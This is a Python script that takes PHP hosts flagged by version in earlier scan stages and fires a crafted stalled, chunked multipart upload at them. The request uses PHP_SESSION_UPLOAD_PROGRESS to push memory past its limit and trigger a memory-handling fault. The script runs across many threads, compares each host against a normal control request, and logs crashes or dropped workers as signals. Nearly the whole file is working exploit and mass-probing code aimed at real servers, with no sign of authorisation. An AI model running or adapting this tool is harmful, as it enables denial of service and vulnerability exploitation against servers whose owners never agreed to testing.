"""php_verify2.py — stage-4 v2 differential OOM trigger with paired controls.

Fed PHP candidates from the earlier version gate (verdict == VULN_VERSION) and
paired patched controls (verdict == PATCHED_VERSION). For every host it runs:

  ident     a fresh GET /                                            (ident A)
  baseline  a normal multipart POST, no stall                        (control)
  trigger   a stalled chunked multipart with repeated big chunks,
            pushed past memory_limit                                 (trigger)
  reident   a fresh GET / immediately after                          (ident B)

A SIGNAL is recorded only when the host's behaviour diverges from its own
control (different response class, connection drop, or not answering the
re-identification). It is still a heuristic, never a claim of code exec.

Writes incrementally; survives cancellation.
"""
import argparse
import json
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

BOUNDARY = "----probe"


def _new_conn(host, port, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, int(port)))
    return s


def send_simple_get(host, port, timeout=4.0):
    try:
        s = _new_conn(host, port, timeout)
        s.sendall(
            f"GET / HTTP/1.0\r\nHost: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (compatible; CI check)\r\n\r\n".encode()
        )
        buf = b""
        try:
            while len(buf) < 2048:
                c = s.recv(1024)
                if not c:
                    break
                buf += c
        except socket.timeout:
            pass
        s.close()
        if buf.startswith(b"HTTP/"):
            return buf.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        return "EMPTY" if not buf else "GARBAGE"
    except (socket.timeout, TimeoutError):
        return "TIMEOUT"
    except ConnectionResetError:
        return "RESET"
    except OSError as e:
        return "ERR " + e.__class__.__name__


def send_baseline(host, port, timeout=4.0):
    """Normal multipart POST without a stall. Used as the control."""
    head = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: 96\r\n\r\n"
    )
    body = (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="x"\r\n\r\n1\r\n'
        f"--{BOUNDARY}--\r\n"
    )
    try:
        s = _new_conn(host, port, timeout)
        s.sendall(head.encode() + body.encode())
        try:
            resp = s.recv(128)
        except socket.timeout:
            return "TIMEOUT"
        s.close()
        if resp.startswith(b"HTTP/"):
            return resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        return "EMPTY" if not resp else "GARBAGE"
    except (socket.timeout, TimeoutError):
        return "TIMEOUT"
    except ConnectionResetError:
        return "RESET"
    except OSError as e:
        return "ERR " + e.__class__.__name__


def send_trigger(host, port, timeout, stall, pressure_bytes, chunk):
    """Stalled multipart; streams repeated large chunks to push past
    memory_limit while the connection is parked past min_freq."""
    burst = "Z" * min(chunk, pressure_bytes)
    body1 = (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + "A" * 256
        + f"\r\n--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
    )
    head = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n\r\n"
    )
    sent = 0
    try:
        s = _new_conn(host, port, timeout)
        s.sendall(head.encode())

        b = body1.encode()
        s.sendall(f"{len(b):X}\r\n".encode() + b + b"\r\n")
        sent += len(b)

        s.sendall(b"1\r\nA\r\n")
        sent += 1

        # Park past session.upload_progress.min_freq so the handler re-enters
        # init and frees the request HashTable.
        time.sleep(stall)

        burst_b = burst.encode()
        while sent < pressure_bytes:
            s.sendall(f"{len(burst_b):X}\r\n".encode() + burst_b + b"\r\n")
            sent += len(burst_b)
        s.sendall(b"0\r\n\r\n")
        try:
            resp = s.recv(256)
        except socket.timeout:
            return "TIMEOUT"
        s.close()
        if resp.startswith(b"HTTP/"):
            return resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        return "EMPTY" if not resp else "GARBAGE"
    except (socket.timeout, TimeoutError):
        return "TIMEOUT"
    except ConnectionResetError:
        return "RESET"
    except OSError as e:
        return "ERR " + e.__class__.__name__


def offline(ep):
    return ep.startswith("ERR ") or ep in ("RESET", "TIMEOUT")


def classify(ident_a, baseline, trigger, ident_b):
    """Differential verdict. A SIGNAL requires a change relative to control
    AND evidence the host either crashed, reset, or stopped responding."""
    if not offline(ident_a) and offline(ident_b):
        return "SIGNAL_WORKER_DROP"
    if not offline(baseline) and trigger in ("TIMEOUT", "RESET"):
        return "SIGNAL_DIVERGENCE"
    return "NO_SIGNAL"


def probe_host(row, timeout, stall, pressure_bytes, chunk):
    host, _, port = row["endpoint"].rpartition(":")
    port = int(port)
    ident_a = send_simple_get(host, port, timeout)
    baseline = send_baseline(host, port, timeout)
    trigger = send_trigger(host, port, timeout, stall, pressure_bytes, chunk)
    ident_b = send_simple_get(host, port, timeout)
    return {
        "endpoint": row["endpoint"],
        "php_version": row.get("version"),
        "server": row.get("server", ""),
        "verdict": classify(ident_a, baseline, trigger, ident_b),
        "ident_a": ident_a,
        "baseline": baseline,
        "trigger": trigger,
        "ident_b": ident_b,
    }


def read_candidates(paths, verdict_wanted):
    """Read stage-3 jsonl rows matching a verdict, deduped by endpoint."""
    out, seen = [], set()
    for p in paths:
        try:
            for line in open(p):
                line = line.strip()
                if not line:
                    continue
                try:
                    r = json.loads(line)
                except ValueError:
                    continue
                ep = r.get("endpoint", "")
                if r.get("verdict") == verdict_wanted and ep and ep not in seen:
                    seen.add(ep)
                    out.append(r)
        except OSError:
            pass
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cands", nargs="+", required=True, help="stage3 jsonl files")
    ap.add_argument("--out", required=True, help="differential results jsonl")
    ap.add_argument("--workers", type=int, default=48)
    ap.add_argument("--timeout", type=float, default=6.0)
    ap.add_argument("--stall", type=float, default=1.6)
    ap.add_argument("--pressure-mb", type=int, default=24)
    ap.add_argument("--chunk-kb", type=int, default=512)
    ap.add_argument("--budget", type=int, default=420)
    args = ap.parse_args()

    pressure_bytes = args.pressure_mb * 1024 * 1024
    chunk = args.chunk_kb * 1024

    vuln = read_candidates(args.cands, "VULN_VERSION")
    controls = read_candidates(args.cands, "PATCHED_VERSION")
    print(f"vuln targets={len(vuln)} control targets={len(controls)}", flush=True)

    targets = [("vuln", r) for r in vuln] + [("control", r) for r in controls]
    start = time.time()
    results = []
    with open(args.out, "a", buffering=1) as fh, ThreadPoolExecutor(
        max_workers=args.workers
    ) as pool:
        futures = {
            pool.submit(probe_host, r, args.timeout, args.stall, pressure_bytes, chunk): (
                kind,
                r,
            )
            for kind, r in targets
        }
        for fut in as_completed(futures):
            if time.time() - start > args.budget:
                print("BUDGET EXHAUSTED, stopping early", flush=True)
                break
            kind, row = futures[fut]
            try:
                res = fut.result()
            except Exception as e:  # noqa: BLE001
                res = {
                    "endpoint": row.get("endpoint", "?"),
                    "verdict": "ERR " + e.__class__.__name__,
                }
            res["group"] = kind
            fh.write(json.dumps(res) + "\n")
            fh.flush()
            results.append(res)

    from collections import Counter

    print("\nsummary by group:")
    for kind in ("vuln", "control"):
        sub = [r for r in results if r.get("group") == kind]
        print(f"  {kind}: n={len(sub)}  {dict(Counter(r['verdict'] for r in sub))}")

    sig = [r for r in results if r.get("verdict", "").startswith("SIGNAL")]
    print(f"\nsignals: {len(sig)}")
    for r in sig:
        print(
            f"  {r['endpoint']:<22} {r['verdict']:<22} php={r.get('php_version')} "
            f"srv={(r.get('server') or '')[:30]} ctl={r.get('baseline')} "
            f"trig={r.get('trigger')} idA={r.get('ident_a')} idB={r.get('ident_b')}"
        )


if __name__ == "__main__":
    main()
